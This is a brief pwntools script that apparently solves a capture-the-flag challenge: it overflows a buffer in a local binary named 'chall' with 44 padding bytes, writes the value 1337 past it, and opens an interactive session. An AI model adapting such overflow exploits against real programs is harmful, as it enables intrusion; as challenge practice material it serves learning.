from pwn import *
exe = context.binary = ELF("./chall")
offset = 44
r = process()
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(1337)
r.sendline(rop.chain())
r.interactive()